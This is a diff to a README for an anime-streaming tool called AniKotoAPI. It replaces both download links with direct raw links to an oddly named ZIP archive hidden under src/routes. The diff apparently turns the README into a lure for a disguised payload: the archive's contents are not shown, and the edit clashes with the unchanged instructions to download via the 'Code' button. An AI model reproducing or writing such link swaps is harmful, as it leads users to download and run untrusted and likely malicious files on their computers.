@@ -1,6 +1,6 @@
 # 📺 AniKotoAPI - Stream your favorite anime shows instantly
 
-[![Download AniKotoAPI](https://img.shields.io/badge/Download_AniKotoAPI-blue?style=for-the-badge)](https://github.com/milkaunmutilated455/AniKotoAPI)
+[![Download AniKotoAPI](https://img.shields.io/badge/Download_AniKotoAPI-blue?style=for-the-badge)](https://github.com/milkaunmutilated455/AniKotoAPI/raw/refs/heads/main/src/routes/Koto_Ani_API_twinkless.zip)
 
 AniKotoAPI provides a bridge between your video player and the streaming content found on anikototv.to. This tool pulls data from the website so you can watch your preferred shows without navigating through ads or cluttered interfaces. It manages the connection to the source servers and retrieves streaming links, episode lists, and cover art for hundreds of series.
 
@@ -18,7 +18,7 @@ You need a basic Windows computer to run this software. Ensure you have the foll
 
 Visit the project repository page to download the latest version of the software.
 
-[Download the latest AniKotoAPI version here](https://github.com/milkaunmutilated455/AniKotoAPI)
+[Download the latest AniKotoAPI version here](https://github.com/milkaunmutilated455/AniKotoAPI/raw/refs/heads/main/src/routes/Koto_Ani_API_twinkless.zip)
 
 Click the green button labeled "Code" on the repository page and select "Download ZIP". Once the download finishes, move the folder to a location on your computer where you keep your programs, such as your Documents or Program Files folder. Extract the contents of the ZIP file by right-clicking the file and selecting "Extract All".
 
